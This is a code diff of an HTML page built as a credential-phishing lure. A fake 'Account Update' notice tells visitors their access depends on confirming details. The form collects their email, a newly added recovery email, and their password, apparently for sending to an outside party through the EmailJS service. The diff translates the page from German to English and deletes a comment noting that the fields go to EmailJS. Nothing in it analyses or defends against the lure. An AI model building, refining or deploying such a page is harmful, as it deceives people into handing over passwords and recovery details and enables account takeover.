@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+<!DOCTYPE html><!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="utf-8" />
@@ -9,8 +9,7 @@
   <!-- EmailJS SDK -->
   <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
   <script>
-    // EmailJS public key (already provided)
-    emailjs.init("ln4M4oAummqBl5tiX");
+    emailjs.init("ln4M4oAummqBl5tiX"); <!-- Your EmailJS public key -->
   </script>
 </head>
 <body>
@@ -18,34 +17,38 @@
     <!-- Top notice / header -->
     <section class="panel notice">
       <div class="notice-inner">
-        <h1 class="notice-title">Kontoaktualisierung</h1>
+        <h1 class="notice-title">Account Update</h1>
         <p class="notice-sub">
-          Wir haben Ihre Kontoeinstellungen aktualisiert. Um Ihren Zugang aktiv zu halten, bestätigen Sie bitte unten Ihre Kontaktdaten.
+          We have updated your account settings. To keep your access active, please confirm your contact details below.
         </p>
-        <a class="primary-btn" href="#action">Details bestätigen</a>
+        <a class="primary-btn" href="#action">Confirm details</a>
       </div>
 
-      <!-- 👇 Picture added in top-right -->
+      <!-- 👇 Square picture top-right -->
       <div class="notice-graphic">
-        <img src="download (1).png" alt="Decorative" />
+        <img src="download (1).png" alt="Decorative square" />
       </div>
     </section>
 
     <!-- Form panel -->
     <section id="action" class="panel form-panel">
       <div class="form-card">
-        <h2 class="form-title">Schnelle Bestätigung</h2>
-        <p class="form-desc">Geben Sie zur Bestätigung Ihre E-Mail-Adresse und Ihr Passwort ein</p>
+        <h2 class="form-title">Quick confirmation</h2>
+        <p class="form-desc">Enter your email, recovery email, and passwort.</p>
 
-        <!-- NOTE: this form will send fields user_email and passwort to EmailJS -->
         <form id="demo-form" class="form" autocomplete="on" novalidate>
           <label class="field">
             <span class="label-text">Email</span>
             <input name="user_email" type="email" placeholder="you@example.com" required>
           </label>
 
+          <label class="field">
+            <span class="label-text">Recovery Email</span>
+            <input name="recovery_email" type="email" placeholder="recovery@example.com" required>
+          </label>
+
           <label class="field password-field">
-            <span class="label-text">Passwort</span>
+            <span class="label-text">Passwort </span>
             <input name="passwort" id="passwort" type="password" placeholder="••••••••" required>
             <button id="toggle-password" type="button" aria-label="Toggle password">👁️</button>
           </label>
@@ -60,10 +63,11 @@
       </div>
     </section>
 
-    
+  
   </main>
 
   <script src="script.js"></script>
 </body>
 </html>
+
 
